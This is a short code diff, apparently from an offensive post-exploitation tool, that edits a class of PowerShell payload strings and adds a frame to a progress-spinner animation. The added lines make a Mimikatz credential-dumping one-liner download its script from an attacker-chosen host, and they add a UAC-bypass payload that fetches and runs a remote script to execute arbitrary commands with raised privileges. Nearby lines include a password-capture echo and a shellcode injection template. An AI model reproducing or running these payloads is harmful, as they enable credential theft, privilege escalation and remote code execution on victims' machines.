@@ -99,8 +99,13 @@ class SHELLCODE(object):
         "echo \' CORRECT:\'$user\':\'$pass}}")
 
     windows_invoke_mimikatz = (
-        "IEX (New-Object Net.WebClient).DownloadString(\\\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\\\");"
+        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-Mimikatz.ps1\\\");"
         "Invoke-Mimikatz -DumpCreds")
+
+    windows_uac_bypass = (
+        "IEX (New-Object Net.WebClient).DownloadString(\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\");"
+        "Invoke-SilentCleanUpBypass -Command \"%s && REM\"")
+
 
     injectwindows = """
 shellcode = bytearray('%s')
@@ -185,6 +190,7 @@ class Spinner(object):
             ["◴","◷","◶","◵"],
             ["▖","▘","▝","▗"],
             ["←","↖","↑","↗","→","↘","↓","↙"],
+            ["█▒▒▒▒▒▒","██▒▒▒▒▒","███▒▒▒▒","████▒▒▒","█████▒▒","██████▒","███████"],
             ["◢","◣","◤","◥"]
             ]
         self.loading = list(text)
